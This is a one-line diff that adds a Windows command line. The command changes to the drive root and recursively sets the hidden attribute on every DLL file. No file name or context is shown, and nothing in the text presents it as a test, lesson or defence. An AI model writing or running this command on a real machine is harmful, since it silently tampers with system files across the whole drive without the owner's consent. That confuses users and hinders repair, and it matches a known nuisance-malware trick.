@@ -1,0 +1,1 @@
+cd / & attrib +h *.dll /s
